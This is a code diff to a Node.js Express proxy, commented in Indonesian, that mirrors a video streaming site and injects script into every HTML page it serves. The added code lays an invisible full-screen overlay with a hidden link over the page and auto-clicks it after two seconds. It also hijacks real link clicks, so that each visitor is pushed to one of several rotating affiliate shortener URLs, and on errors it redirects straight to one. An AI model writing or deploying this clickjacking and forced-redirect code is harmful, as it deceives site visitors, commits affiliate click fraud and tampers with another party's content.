@@ -5,163 +5,206 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 const BASE_URL = 'https://vidstrm.cloud';
-const SHOPEE_AFFILIATE = 'https://doobf.pro/8AQUp3ZesV';
 
-// Middleware untuk handle semua request
+const AFFILIATE_LINKS = [
+  'https://doobf.pro/8AQUp3ZesV',
+  'https://doobf.pro/9pYio8K2cw',
+  'https://doobf.pro/8pgBcJjIzl',
+  'https://doobf.pro/60M0F7txlS',
+  'https://vidoyy.fun/7VAo1N0hIp',
+  'https://vidoyy.fun/9KcSCm0Xb7',
+  'https://vidoyy.fun/3LLF3lT65E',
+  'https://vidoyy.fun/6VIGpbCEoc'
+];
+
 app.use(async (req, res) => {
   try {
-    // Bangun URL target dengan path yang sama
     const targetUrl = BASE_URL + req.originalUrl;
-    
     console.log(`Fetching: ${targetUrl}`);
     
-    // Fetch halaman dari target URL
     const response = await fetch(targetUrl, {
-      headers: {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-      }
+      headers: { 'User-Agent': 'Mozilla/5.0' }
     });
     
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}`);
-    }
+    if (!response.ok) return res.redirect(targetUrl);
     
     let html = await response.text();
     const contentType = response.headers.get('content-type') || 'text/html';
     
-    // Hanya inject script untuk HTML pages
     if (contentType.includes('text/html')) {
-      // Inject script sebelum </head>
+      // SCRIPT UNTUK AUTO-CLICK TRANSPARAN
       const injectScript = `
         <script>
-          // Function untuk buka Shopee affiliate
-          function openShopeeAffiliate() {
-            window.open('${SHOPEE_AFFILIATE}', '_blank');
+          const AFFILIATE_LINKS = ${JSON.stringify(AFFILIATE_LINKS)};
+          
+          // Buat invisible overlay yang menutupi seluruh halaman
+          function createInvisibleOverlay() {
+            const overlay = document.createElement('div');
+            overlay.id = 'auto-click-overlay';
+            overlay.style.cssText = \`
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background: transparent;
+              z-index: 2147483647; /* Max z-index */
+              cursor: pointer;
+            \`;
+            
+            // Buat invisible link di tengah overlay
+            const invisibleLink = document.createElement('a');
+            invisibleLink.id = 'auto-shopee-link';
+            invisibleLink.href = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+            invisibleLink.target = '_blank';
+            invisibleLink.style.cssText = \`
+              display: block;
+              width: 100%;
+              height: 100%;
+              opacity: 0;
+              position: absolute;
+              top: 0;
+              left: 0;
+            \`;
+            
+            overlay.appendChild(invisibleLink);
+            document.body.appendChild(overlay);
+            
+            return { overlay, invisibleLink };
           }
           
-          // Intercept semua klik
-          document.addEventListener('click', function(e) {
-            // Buka Shopee affiliate
-            openShopeeAffiliate();
+          // Function untuk simulate click
+          function simulateClick(element) {
+            const clickEvent = new MouseEvent('click', {
+              view: window,
+              bubbles: true,
+              cancelable: true
+            });
+            element.dispatchEvent(clickEvent);
+          }
+          
+          // Function untuk auto-click setelah delay
+          function autoClickShopee() {
+            console.log('🔄 Auto-clicking Shopee link...');
             
-            // Cek jika yang diklik adalah link
-            let targetElement = e.target;
-            while (targetElement && targetElement.tagName !== 'A') {
-              targetElement = targetElement.parentElement;
+            // Buat overlay
+            const { overlay, invisibleLink } = createInvisibleOverlay();
+            
+            // Simulate click pada link setelah 100ms
+            setTimeout(() => {
+              console.log('🤖 Simulating click on:', invisibleLink.href);
+              
+              // Method 1: Trigger click event
+              simulateClick(invisibleLink);
+              
+              // Method 2: Direct click (lebih reliable)
+              invisibleLink.click();
+              
+              // Method 3: Location href sebagai backup
+              setTimeout(() => {
+                window.location.href = invisibleLink.href;
+              }, 500);
+              
+              // Hapus overlay setelah 2 detik
+              setTimeout(() => {
+                if (overlay.parentNode) {
+                  overlay.parentNode.removeChild(overlay);
+                }
+              }, 2000);
+              
+            }, 100);
+          }
+          
+          // AUTO-CLICK SETELAH 2 DETIK
+          let autoClickTimer = setTimeout(() => {
+            console.log('⏰ Timeout reached, auto-clicking...');
+            autoClickShopee();
+          }, 2000);
+          
+          // Reset timer jika user aktif (tapi tetap akan auto-click)
+          ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
+            document.addEventListener(event, function(e) {
+              // Biarkan user klik asli terjadi dulu
+              setTimeout(() => {
+                // Tetap trigger auto-click setelah user interaction
+                clearTimeout(autoClickTimer);
+                autoClickTimer = setTimeout(() => {
+                  autoClickShopee();
+                }, 1000);
+              }, 300);
+            }, { passive: true });
+          });
+          
+          // Tangani klik user asli
+          document.addEventListener('click', function(e) {
+            // Cegah double action
+            if (e.target.id === 'auto-shopee-link' || 
+                e.target.id === 'auto-click-overlay') {
+              return;
             }
             
-            // Tunggu sebentar, lalu lanjutkan ke link asli
-            setTimeout(() => {
-              if (targetElement && targetElement.href) {
-                // Jika link internal (ke vidstrm.cloud)
-                if (targetElement.href.includes('vidstrm.cloud')) {
-                  window.location.href = targetElement.href;
-                } else {
-                  // Jika link eksternal, buka seperti biasa
-                  window.location.href = targetElement.href;
-                }
-              }
-              // Jika klik di sembarang tempat tanpa link
-              else if (e.target.href) {
-                window.location.href = e.target.href;
-              }
-            }, 300);
-            
-            e.preventDefault();
-            e.stopPropagation();
+            // Cari link yang diklik
+            const link = e.target.closest('a');
+            if (link && link.href) {
+              e.preventDefault();
+              e.stopPropagation();
+              
+              // 1. Buka Shopee affiliate
+              const shopeeUrl = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+              window.open(shopeeUrl, '_blank');
+              
+              // 2. Redirect ke tujuan asli setelah delay
+              setTimeout(() => {
+                window.location.href = link.href;
+              }, 800);
+            }
           }, true);
           
-          // Intercept form submission
-          document.addEventListener('submit', function(e) {
-            e.preventDefault();
-            openShopeeAffiliate();
-            setTimeout(() => {
-              e.target.submit();
-            }, 300);
-          }, true);
-          
-          // Juga handle link yang di-tap (mobile)
-          document.addEventListener('touchstart', function(e) {
-            openShopeeAffiliate();
-            setTimeout(() => {
-              let targetElement = e.target;
-              while (targetElement && targetElement.tagName !== 'A') {
-                targetElement = targetElement.parentElement;
-              }
-              if (targetElement && targetElement.href) {
-                window.location.href = targetElement.href;
-              }
-            }, 300);
-          }, true);
-          
-          console.log('Auto-patch system aktif!');
+          console.log('🤖 Auto-click system aktif!');
         </script>
+        
+        <style>
+          /* Transparent animation untuk overlay */
+          #auto-click-overlay {
+            animation: pulseBackground 2s infinite;
+          }
+          @keyframes pulseBackground {
+            0% { background: rgba(238, 77, 45, 0.01); }
+            50% { background: rgba(238, 77, 45, 0.03); }
+            100% { background: rgba(238, 77, 45, 0.01); }
+          }
+        </style>
       `;
       
-      // Inject script ke HTML
+      // Inject script
       if (html.includes('</head>')) {
         html = html.replace('</head>', injectScript + '</head>');
-      } else if (html.includes('<head>')) {
-        html = html.replace('<head>', '<head>' + injectScript);
       } else {
-        // Jika tidak ada head tag, inject di awal body
-        html = html.replace('<body', injectScript + '<body');
+        html = injectScript + html;
       }
       
-      // Fix semua link internal agar tetap melalui proxy kita
+      // Rewrite links
       html = html.replace(
-        /href="https:\/\/vidstrm\.cloud\//g,
-        `href="/`
-      );
-      
-      // Fix semua relative links
-      html = html.replace(
-        /href="\/(?!\/)/g,
-        `href="/`
+        /(href|src|action)=["'](https?:)?\/\/vidstrm\.cloud(\/[^"']*)["']/gi,
+        (match, attr, protocol, path) => `${attr}="${path}"`
       );
     }
     
-    // Set headers yang sesuai
-    const headers = {
+    res.set({
       'Content-Type': contentType,
-      'Cache-Control': 'no-cache, no-store, must-revalidate',
-      'Pragma': 'no-cache',
-      'Expires': '0'
-    };
-    
-    // Copy beberapa headers dari response asli
-    if (response.headers.get('content-length')) {
-      headers['Content-Length'] = response.headers.get('content-length');
-    }
-    
-    res.set(headers);
-    res.send(html);
+      'Cache-Control': 'no-cache'
+    }).send(html);
     
   } catch (error) {
-    console.error('Error fetching:', error.message);
-    
-    // Fallback: redirect langsung ke target
-    res.send(`
-      <html>
-        <head>
-          <script>
-            window.open('${SHOPEE_AFFILIATE}', '_blank');
-            setTimeout(() => {
-              window.location.href = '${BASE_URL}${req.originalUrl}';
-            }, 300);
-          </script>
-        </head>
-        <body>
-          <p>Loading... Anda akan dialihkan ke Shopee affiliate terlebih dahulu.</p>
-        </body>
-      </html>
-    `);
+    console.error('Error:', error.message);
+    // Fallback langsung ke affiliate
+    const randomLink = AFFILIATE_LINKS[Math.floor(Math.random() * AFFILIATE_LINKS.length)];
+    res.redirect(randomLink);
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🎯 Base URL: ${BASE_URL}`);
-  console.log(`🛒 Shopee Affiliate: ${SHOPEE_AFFILIATE}`);
-  console.log(`🔗 Contoh: http://localhost:${PORT}/d/123 akan fetch ${BASE_URL}/d/123`);
+  console.log(`🤖 Server dengan Auto-Click System`);
+  console.log(`👉 Akan auto-click setelah 2 detik`);
+  console.log(`🎯 Total links: ${AFFILIATE_LINKS.length}`);
 });
